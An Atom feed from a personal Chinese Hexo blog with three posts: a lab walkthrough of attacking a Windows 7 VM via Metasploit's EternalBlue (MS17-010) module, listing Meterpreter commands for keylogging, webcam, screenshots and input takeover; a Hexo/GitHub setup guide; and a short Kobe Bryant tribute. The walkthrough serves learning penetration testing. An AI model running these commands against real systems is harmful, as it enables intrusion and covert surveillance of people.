<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>IgTa&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-14T14:16:24.729Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Zhang Haonan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>metasploit下利用永恒之蓝攻击win7</title>
    <link href="http://yoursite.com/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/"/>
    <id>http://yoursite.com/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/</id>
    <published>2020-04-14T10:08:49.000Z</published>
    <updated>2020-04-14T14:16:24.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="metasploit下利用永恒之蓝攻击win7"><a href="#metasploit下利用永恒之蓝攻击win7" class="headerlink" title="metasploit下利用永恒之蓝攻击win7"></a>metasploit下利用永恒之蓝攻击win7</h1><p>实验环境：VMware<br>kali作为攻击机，win7作为靶机（防火墙和杀软已关闭）<br>渗透攻击(exploit)：指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。<br>攻击载荷(payload)：是我们期望目标系统在渗透攻击之后去执行的代码  </p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>1.初次使用metasploit需要初始化数据库<br><code>msfdb init/reinit</code><br>2.开启数据库<br><code>sudo service postgresql start</code><br>3.进入msf<br><code>msfconsole</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf1.jpg"  alt><br>4.搜索cve17-010相关的exp<br><code>search ms17-010</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf2.jpg"  alt><br>5.使用1号exp扫描漏洞是否存在<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br>查看相关参数<br><code>options</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf3.jpg"  alt><br>指定靶机ip<br><code>set RHOSTS 192.168.XXX.XXX</code>  </p><p>6.运行<br><code>run</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf4.jpg"  alt></p><h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h4><p>7.进入攻击模块（2号漏洞）<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>查看相关参数<br><code>options</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf5.jpg"  alt><br>可以看出受影响的分别是win7和server 2008 R2两种操作系统<br>指定靶机ip<br><code>set RHOSTS 192.168.XXX.XXX</code>  </p><p>8.查看payload<br><code>show payloads</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf6.jpg"  alt><br>使用15号payload<br><code>set payload 15</code><br>查看payload所需参数<br><code>options</code><br>设置本机(kali)ip<br><code>set LHOST 192.168.XXX.XXX</code>  </p><p>9.发动攻击<br><code>exploit</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf7.jpg"  alt> </p><h4 id="一些meterpreter命令"><a href="#一些meterpreter命令" class="headerlink" title="一些meterpreter命令"></a>一些meterpreter命令</h4><p><code>webcam_scream</code>  开启摄像头<br><code>screenshot</code> 截屏<br><code>keyscan_start</code> 开启键盘记录功能<br><code>keyscan_dump</code> 显示捕捉到的键盘记录信息<br><code>keyscan_stop</code>停止键盘记录功能<br><code>uictl enable keyboard/mouse</code> 接管目标主机的键盘和鼠标<br><code>reboot</code> 重启靶机<br><code>shutdown</code> 关闭靶机  </p><h4 id="截屏成功"><a href="#截屏成功" class="headerlink" title="截屏成功"></a>截屏成功</h4><p><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf8.png"  alt><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf9.jpg"  alt> </p>]]></content>
    
    <summary type="html">
    
      使用kali进攻靶机
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hexo+github 部署</title>
    <link href="http://yoursite.com/2020/04/02/hexo-github-%E9%83%A8%E7%BD%B2/"/>
    <id>http://yoursite.com/2020/04/02/hexo-github-%E9%83%A8%E7%BD%B2/</id>
    <published>2020-04-02T02:20:35.000Z</published>
    <updated>2020-04-02T15:44:57.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-github-部署"><a href="#hexo-github-部署" class="headerlink" title="hexo+github 部署"></a>hexo+github 部署</h1><p>推荐两篇教程<br><a href="https://www.cnblogs.com/visugar/p/6821777.html" target="_blank" rel="noopener">hexo从零开始到搭建完整</a><br><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html0" target="_blank" rel="noopener">使用hexo+github搭建免费个人博客详细教程</a><br>搭配使用基本能完成hexo的搭建  </p><h2 id="一些小坑"><a href="#一些小坑" class="headerlink" title="一些小坑"></a>一些小坑</h2><h4 id="1-安装git-bash"><a href="#1-安装git-bash" class="headerlink" title="1.安装git bash"></a>1.安装git bash</h4><p>咱大天朝就是qiang，<a href="https://gitforwindows.org/" target="_blank" rel="noopener">官网</a>下老半天下不完，无奈，用了百度网盘共享的git<br><a href="https://pan.baidu.com/s/1KxgfuCrVJPZCRv276QC4PQ" target="_blank" rel="noopener">Git-2.18.0-64-bit</a> 提取码：xxac<br><a href="https://pan.baidu.com/s/1yvpe84Ddh53RKRwV7dz0MA" target="_blank" rel="noopener">Git-2.19.0-64-bit</a> 提取码：peon  </p><h4 id="2-安装hexo"><a href="#2-安装hexo" class="headerlink" title="2.安装hexo"></a>2.安装hexo</h4><p>NodeJs的安装没遇到什么问题，一路next搞定<br>接下来安装hexo，<code>npm i -g hexo</code> +回车一气呵成，然后。。。卡住。。。  </p><p>还好有淘宝，切换taobao镜像  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>验证是否切换成功：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>输出淘宝源的地址 <a href="https://registry.npm.taobao.org/，" target="_blank" rel="noopener">https://registry.npm.taobao.org/，</a> 即切换成功。  </p><p>或者用cnpm也可代替大部分npm<br>安装代码: <code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p><h4 id="3-初始化hexo"><a href="#3-初始化hexo" class="headerlink" title="3.初始化hexo"></a>3.初始化hexo</h4><p>创建存放博客的文件夹，cd到该文件夹下，轻轻敲下 <code>hexo init</code> ，然后我又不出意外的卡住了。。别慌，说不定敲敲回车它就动了呢（别忘了还有cnpm可用）<br>当打开文件夹能看到一大堆文件时，成功已经不远啦  </p><h4 id="4-GitHub的相关配置"><a href="#4-GitHub的相关配置" class="headerlink" title="4.GitHub的相关配置"></a>4.GitHub的相关配置</h4><ul><li><p>创建账号<br>创建好账号后，改一下用户名，毕竟要在url上显示的（捂脸，我竟然不会改名）<br>点击头像右边的小三角，在setting中设置。<br>Public profile中的name是别人看到你时的名字<br>真正修改是在account中，点击change username，仔细看提示信息，假装看懂后就可以改名了  </p></li><li><p>创建repo<br>点击New repository创建一个repo，名称格式为: yourgithubname.github.io<br>把最下面那个initialize的复选框勾上，点击创建  </p></li><li><p>配置github账户信息  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;XXXXX&quot;  </span><br><span class="line">git config --global user.email  &quot;xxx@xx.com&quot;</span><br></pre></td></tr></table></figure></li><li><p>创建SSH  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure></li></ul><p>连续回车，然后去C盘user目录下找到.ssh\id_rsa.pub文件，用记事本复制里面的内容，放进GitHub个人设置中的SSH，title无所谓，保存搞定。<br>命令行敲下 <code>ssh -T git@github.com</code><br>提示Are you sure you want to continue connecting (yes/no)?，输入yes，如果看到看到以下信息：<br>Hi XXX! You’ve successfully authenticated, but GitHub does not provide shell access.<br>说明SSH配置成功啦！</p><ul><li>_config.yml的配置  </li></ul><p>用记事本/编辑器打开，修改deploy部分（一般在最下面）<br>我采用的是下面这种配置方式(注意，键值后要有空格)    </p><pre><code>---deploy:  type: git  repository: git@github.com:yourgithubname/  yourgithubname.github.io.git  branch: master  ---</code></pre><ul><li>安装一些插件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm i hexo-server</span><br></pre></td></tr></table></figure><ul><li>按顺序执行以下命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>应该没啥了，打开localhost:4000就能看见本地的博客啦  </p><blockquote><p>常用命令</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章  </span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面  </span><br><span class="line">hexo generate #生成静态页面至public目录  </span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）  </span><br><span class="line">hexo deploy #部署到GitHub  </span><br><span class="line">hexo help  # 查看帮助  </span><br><span class="line">hexo version  #查看Hexo的版本</span><br></pre></td></tr></table></figure><blockquote><p>缩写</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo n &#x3D;&#x3D; hexo new  </span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate  </span><br><span class="line">hexo s &#x3D;&#x3D; hexo server  </span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy</span><br></pre></td></tr></table></figure><blockquote><p>组合</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo s -g #生成并本地预览  </span><br><span class="line">hexo d -g #生成并上传</span><br></pre></td></tr></table></figure><p>直接照着命令上传GitHub就行了，在浏览器中输入 <a href="http://yourgithubname.github.io" target="_blank" rel="noopener">http://yourgithubname.github.io</a> 就能看见你的博客了，吐槽一下GitHub。。真真卡成dog  </p><h4 id="5-写博客"><a href="#5-写博客" class="headerlink" title="5.写博客"></a>5.写博客</h4><p>用命令创建或者直接在source/_posts下创建md格式文件（有格式要求，最好还是用命令），然后就能用markdown写博客了  </p><p>我使用的是vscode，安装了两个插件 Markdown All in one(组合包)和Markdown Preview Github Styling(本地预览Markdown文件最终在Github Pages中显示的效果)  </p><p><a href="https://www.runoob.com/markdown/md-tutorial.html" target="_blank" rel="noopener">Markdown教程</a>  </p><h4 id="6-博客主题"><a href="#6-博客主题" class="headerlink" title="6.博客主题"></a>6.博客主题</h4><p>差点忘了还有主题这码事，可以用git直接下载到themes中，但。。git总是给我惊喜，所以我就直接去官网下载压缩包，解压到themes中，下载好后别忘了在_config.yml中修改主题，即theme：主题名。</p><p>若更改主题后启动服务器，显示如下：<br>extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial<br>解决方法：<br>执行<br><code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code><br>清除缓存<br><code>hexo clean</code><br>生成静态文件<br><code>hexo g</code></p><h4 id="7-新建分类categories"><a href="#7-新建分类categories" class="headerlink" title="7.新建分类categories"></a>7.新建分类categories</h4><p>categories 页是用来展示所有分类的页面，如果 source 目录下还没有 categories/index.md 文件，那么你就需要新建一个，命令:  <code>hexo new page &quot;categories&quot;</code></p><p>编辑你刚刚新建的页面文件 /source/categories/index.md，至少需要以下内容:</p><pre><code>---title: categories  date: 2018-09-30 17:25:30  type: &quot;categories&quot;  layout: &quot;categories&quot;---</code></pre><h4 id="8-新建标签-tags-页"><a href="#8-新建标签-tags-页" class="headerlink" title="8.新建标签 tags 页"></a>8.新建标签 tags 页</h4><p>tags 页是用来展示所有标签的页面，如果在你的博客 source 目录下还没有 tags/index.md 文件，那么你就需要新建一个，命令：<br><code>hexo new page &quot;tags&quot;</code></p><p>编辑你刚刚新建的页面文件 /source/tags/index.md，至少需要以下内容：  </p><pre><code>---title: tags  date: 2018-09-30 18:23:38  type: &quot;tags&quot;  layout: &quot;tags&quot;---</code></pre><h4 id="9-新建about关于我页"><a href="#9-新建about关于我页" class="headerlink" title="9.新建about关于我页"></a>9.新建about关于我页</h4><p>about 页是用来展示关于我和我的博客信息的页面，如果在你的博客 source 目录下还没有 about/index.md 文件，那么你就需要新建一个，命令：<br><code>hexo new page &quot;about&quot;</code></p><p>编辑你刚刚新建的页面文件 /source/about/index.md，至少需要以下内容：</p><pre><code>---title: about  date: 2018-09-30 17:25:30  type: &quot;about&quot;  layout: &quot;about&quot;---</code></pre>]]></content>
    
    <summary type="html">
    
      hexo+github安装教程
    
    </summary>
    
    
    
      <category term="安装教程" scheme="http://yoursite.com/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>时光回溯</title>
    <link href="http://yoursite.com/2020/01/26/%E6%97%B6%E5%85%89%E5%9B%9E%E6%BA%AF/"/>
    <id>http://yoursite.com/2020/01/26/%E6%97%B6%E5%85%89%E5%9B%9E%E6%BA%AF/</id>
    <published>2020-01-26T02:24:08.000Z</published>
    <updated>2020-04-02T15:55:43.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="24-8"><a href="#24-8" class="headerlink" title="24 / 8"></a>24 / 8</h1><blockquote><p>洛杉矶的瀑布逆流而上，<br>西班牙人长发飘扬，<br>大鲨鱼还是青涩模样，<br>斯特恩回到选秀大会上，<br>来自费城的13顺位即将登场。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;24-8&quot;&gt;&lt;a href=&quot;#24-8&quot; class=&quot;headerlink&quot; title=&quot;24 / 8&quot;&gt;&lt;/a&gt;24 / 8&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;洛杉矶的瀑布逆流而上，&lt;br&gt;西班牙人长发飘扬，&lt;br&gt;大鲨鱼还是青涩模样，&lt;br&gt;斯特恩
      
    
    </summary>
    
    
    
      <category term="Kobe" scheme="http://yoursite.com/tags/Kobe/"/>
    
  </entry>
  
</feed>
